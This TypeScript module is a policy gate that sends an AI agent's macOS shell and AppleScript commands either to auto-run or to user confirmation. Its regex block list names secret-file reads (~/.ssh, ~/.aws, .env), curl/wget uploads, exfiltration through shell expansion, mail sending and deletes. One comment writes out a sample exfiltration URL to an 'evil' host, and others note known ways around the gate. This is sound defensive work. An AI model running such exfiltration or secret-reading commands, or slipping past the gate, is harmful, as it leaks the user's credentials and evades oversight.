import { homedir } from 'node:os';
import { resolve, sep } from 'node:path';
import { config } from '../config.ts';

/** Where a mac_do decision lands. 'auto' runs unreviewed; 'confirm' routes to the notch. */
export type MacRoute = 'auto' | 'confirm';
export interface MacPolicyResult {
  route: MacRoute;
  reason: string;
}

/**
 * M6 hot-path gate for mac_do, in the M4 supervisor spirit: a PURE table (no model, no
 * I/O) decides auto-run vs notch-confirm. Unlike the Claude supervisor there is no session
 * cwd — mac_do is the user's own voice one-shot — so the boundary for deletes is the agent
 * home + the OS temp dir; everything else escalates. This list can't be an exhaustive
 * shell parser (an obfuscated `nc`/`python` could slip through — the same accepted ceiling
 * as auto mode), but it must not be trivially evaded on the patterns it names. The gate +
 * the mac-audit.jsonl line ARE the mitigation for running outside the Seatbelt (the user,
 * 2026-07-16).
 */

// Bash/osascript patterns that always confirm, checked before anything else. Most are
// `\b`-anchored (not head-of-token), so a directory prefix like /usr/bin/sudo still trips
// them; the command-position patterns (mail) carry their own path-prefix tolerance. Scoped
// patterns use [^|;&\n]* so a match never spans into an unrelated command on another line
// (review 🔵: \n was over-matching; review 🔴: \n was UNDER-anchoring the mail pattern).
// KNOWN RESIDUAL (recorded, accepted for v1): a LITERAL exfil URL — the model composing
// `open location "https://evil/?d=<text it read on screen>"` with no shell expansion —
// passes the "plain download/open" class. Closing that requires a host allowlist like the
// M4.1 egress proxy's; a design decision for M7, not a regex.
const CONFIRM_PATTERNS: Array<{ pattern: RegExp; reason: string }> = [
  { pattern: /\bsudo\b/, reason: 'sudo' },
  // osascript's privilege-escalation form — the AppleScript equivalent of sudo.
  { pattern: /with\s+administrator\s+privileges/i, reason: 'administrator privileges' },
  // Reading a secret store: the env strip keeps keys out of the child process, but a
  // read-only `cat .env` would return them into the voice model's context anyway (the
  // daemon and its bash children run UNSANDBOXED — no Seatbelt backstop on this lane).
  // Same protected set the M4 supervisor guards for Claude sessions.
  { pattern: /\.env\b|\/\.(ssh|aws|npmrc)\b|~\/\.(ssh|aws|npmrc|config\/gh)\b/i, reason: 'reading a secret store' },
  // Sending data off the machine (uploads/POSTs) — plain downloads stay auto (mirrors the
  // supervisor's network-send rule).
  {
    pattern: /\b(curl|wget)\b[^|;&\n]*(\s-(d|F|T)\b|--data\b|--data-[a-z]+\b|--form\b|--upload-file\b|--post-[a-z]+\b|--body-[a-z]+\b|-X\s*(POST|PUT|PATCH|DELETE)\b)/i,
    reason: 'network send',
  },
  // GET-style exfil: a curl/wget/open whose URL/args carry a shell expansion ($VAR, `cmd`,
  // $(…)) can smuggle a secret into a query string — the channel the M4.1 egress proxy
  // closed for the sandboxed lane, which mac_do runs OUTSIDE. Plain `open URL` stays auto
  // (see the literal-URL residual note above). xargs-fed fetchers get their payload from
  // stdin — equally unresolvable, so they confirm too (review 🟡).
  { pattern: /\b(curl|wget|open)\b[^|;&\n]*[$`]/i, reason: 'possible data exfiltration (expanded URL)' },
  { pattern: /\bxargs\b[^|;&\n]*\b(curl|wget|open)\b/i, reason: 'possible data exfiltration (piped fetch)' },
  { pattern: /\bgit\b[^|;&\n]*\bpush\b/, reason: 'git push' },
  // Sending mail: command-position mail/sendmail on ANY separator — including newline,
  // the same separator set riskyDelete splits on (review 🔴: omitting \n let a multiline
  // script bury a `mail` line) — with optional path prefix (/usr/bin/mail) and
  // alias-busting backslash, mirroring commandName's delete-lane normalization.
  { pattern: /(^|[|;&\n\r]\s*)(?:[^\s|;&\n]*\/)?\\?(mail|sendmail)\b/i, reason: 'sending mail' },
  // App-driven sends (Messages/Mail via AppleScript): `send` near a messaging noun in
  // EITHER order. `mail` in the noun list restores the old \bmail\b coverage of
  // `tell application "Mail" to send …` (review 🔴 regression); `participant` is the
  // modern Messages dictionary target (review 🟡).
  { pattern: /\bsend\b[^|;&\n]*\b(message|buddy|chat|imessage|sms|participant|mail)\b|\b(message|buddy|chat|imessage|sms|participant|mail)\b[^|;&\n]*\bsend\b/i, reason: 'sending a message' },
  // `defaults write` mutates system/app prefs; `defaults read` stays auto.
  { pattern: /\bdefaults\s+write\b/, reason: 'writing system defaults' },
  { pattern: /\b(killall|pkill|kill)\b/, reason: 'force-quitting a process' },
  { pattern: /\bshutdown\b|\breboot\b|\bhalt\b/, reason: 'power state change' },
  // osascript that deletes, empties trash, or quits an app (which can drop unsaved work).
  { pattern: /\b(delete|empty\s+trash|quit\s+(app|application))\b/i, reason: 'destructive app action' },
  // Disk / filesystem mutation utilities.
  { pattern: /\b(diskutil|dd|mkfs|fdisk)\b/, reason: 'disk operation' },
];

const DELETE_COMMANDS = new Set(['rm', 'rmdir', 'unlink', 'shred', 'trash']);
// $VAR / ${…} / $(…) / backticks — a target with these can't be resolved statically, so we
// can't prove where it lands: confirm rather than guess (the supervisor's CA1 bypass).
const SHELL_EXPANSION = /[$`]/;
// AppleScript can shell out — gate the INNER command of `do shell script "…"` too.
const DO_SHELL_SCRIPT = /do\s+shell\s+script\s+"([^"]*)"/gi;

// The only directories a delete may auto-run against: the agent home and the OS temp dir.
function safeRoots(): string[] {
  const roots = [config.agentHome, process.env.TMPDIR, '/tmp'].filter(Boolean) as string[];
  return roots.map((r) => resolve(r.replace(/\/+$/, '')));
}

function underAnyRoot(path: string, roots: string[]): boolean {
  const abs = resolve(path.startsWith('~') ? homedir() + path.slice(1) : path);
  return roots.some((root) => abs === root || abs.startsWith(root + sep));
}

function unquote(token: string): string {
  return token.replace(/^['"]|['"]$/g, '');
}

/** Collapse a command token to its bare program name so a full path (`/bin/rm`) or an
 *  alias-busting leading backslash (`\rm`) can't slip a delete past the basename check.
 *  Only for the COMMAND slot — target paths must keep their directory. */
function commandName(token: string): string {
  const bare = unquote(token).replace(/^\\/, '');
  const slash = bare.lastIndexOf('/');
  return slash === -1 ? bare : bare.slice(slash + 1);
}

/** A delete whose target isn't provably inside a safe root → confirm. Conservative by
 *  design: an unresolvable target (shell expansion, stdin-fed xargs) confirms. */
function riskyDelete(command: string): string | null {
  const roots = safeRoots();
  // Split on every command separator INCLUDING newline and single `&` (background) so each
  // command is analyzed on its own — a multi-line script isn't one giant segment.
  for (const segment of command.split(/\|\||&&|[;|&\n]/)) {
    const tokens = segment.trim().split(/\s+/).filter(Boolean);
    if (tokens.length === 0) continue;
    const head = commandName(tokens[0]);

    if (head === 'xargs') {
      if (tokens.slice(1).some((t) => DELETE_COMMANDS.has(commandName(t)))) return 'xargs delete (targets from stdin)';
      continue;
    }

    const idx = tokens.findIndex((t) => DELETE_COMMANDS.has(commandName(t)));
    if (idx === -1) continue;
    let sawTarget = false;
    for (const raw of tokens.slice(idx + 1)) {
      if (raw.startsWith('-')) continue; // a flag, not a path
      sawTarget = true;
      const target = unquote(raw);
      if (SHELL_EXPANSION.test(target) || target.startsWith('~') || !underAnyRoot(target, roots)) {
        return target;
      }
    }
    // `rm` with no resolvable path operand (only flags, or targets from a pipe) → confirm.
    if (!sawTarget) return 'delete with no explicit path';
  }
  return null;
}

/** Pure policy table for a mac_do script — exported for offline unit tests. */
export function macDoDecision(script: string): MacPolicyResult {
  for (const { pattern, reason } of CONFIRM_PATTERNS) {
    if (pattern.test(script)) return { route: 'confirm', reason };
  }
  // AppleScript that shells out (`do shell script "<cmd>"`) hides bash from the patterns
  // above — gate the inner command with the same table. The inner command has no nested
  // `do shell script` (its quotes would need escaping the capture can't span), so this
  // recurses at most one level.
  for (const m of script.matchAll(DO_SHELL_SCRIPT)) {
    const inner = macDoDecision(m[1]);
    if (inner.route === 'confirm') return { route: 'confirm', reason: `do shell script → ${inner.reason}` };
  }
  // A shell-out we can't statically read — a variable body (`do shell script cmd`) or a
  // concatenated literal (`do shell script "r" & "m -rf …"`) — can't be gated: confirm
  // rather than guess, the same stance SHELL_EXPANSION takes in the delete lane (review 🟡:
  // concatenation split the risky token across fragments and slipped the whole table).
  const shellOuts = [...script.matchAll(/do\s+shell\s+script/gi)].length;
  const literalShellOuts = [...script.matchAll(/do\s+shell\s+script\s+"([^"]*)"(?!\s*&)/gi)].length;
  if (shellOuts > literalShellOuts) {
    return { route: 'confirm', reason: 'unresolvable shell-out (do shell script)' };
  }
  const badDelete = riskyDelete(script);
  if (badDelete) return { route: 'confirm', reason: `delete outside safe dirs (${badDelete})` };
  return { route: 'auto', reason: 'read-only / reversible command' };
}

/** One short human line for the notch confirm. The risky-class reason (which carries the
 *  operative token — e.g. the resolved delete target) is prepended by the caller, so this
 *  just needs enough of the script to be recognizable. */
export function describeMacDo(script: string): string {
  const text = script.replace(/\s+/g, ' ').trim();
  return text.length > 160 ? text.slice(0, 157) + '…' : text;
}

/** The model sometimes double-wraps: interpreter 'osascript' AND a script of
 *  `osascript -e '…'` — which then fails as AppleScript (live demo, 2026-07-16). Unwrap the
 *  `-e` bodies into plain AppleScript source. Anything else passes through untouched.
 *  KNOWN LIMIT: a `-e` body with escaped/mixed quotes gets truncated at the first inner
 *  quote — that's SAFE because gate and executor both receive the same mangled string (the
 *  script just fails to run); it can never make the gate see less than the executor runs. */
export function normalizeOsascript(script: string): string {
  const trimmed = script.trim();
  if (!/^osascript\b/.test(trimmed)) return trimmed;
  const bodies = [...trimmed.matchAll(/-e\s+(?:'([^']*)'|"([^"]*)")/g)]
    .map((m) => m[1] ?? m[2])
    .filter((b) => b !== undefined && b !== '');
  return bodies.length > 0 ? bodies.join('\n') : trimmed;
}

/** ONE choke point for both script lanes (hot mac_do + sub-agent run_script): normalize
 *  first, then decide on the SAME string the executor will run (review 🟡: the two lanes
 *  each did this independently and had already drifted). Shortcuts are opaque to the
 *  pattern table, so the LANE decides: the hot lane auto-runs them (the user spoke the
 *  shortcut's name himself); the sub-agent lane confirms them (it acts on untrusted
 *  on-screen text, and a named Shortcut can be arbitrarily destructive). */
export function gateScript(
  interpreter: 'bash' | 'osascript' | 'shortcuts',
  raw: string,
  lane: 'hot' | 'subagent',
): { script: string; decision: MacPolicyResult } {
  const script = interpreter === 'osascript' ? normalizeOsascript(raw) : raw.trim();
  if (interpreter === 'shortcuts') {
    return {
      script,
      decision:
        lane === 'subagent'
          ? { route: 'confirm', reason: 'running a Shortcut' }
          : { route: 'auto', reason: 'shortcut named by the user' },
    };
  }
  return { script, decision: macDoDecision(script) };
}
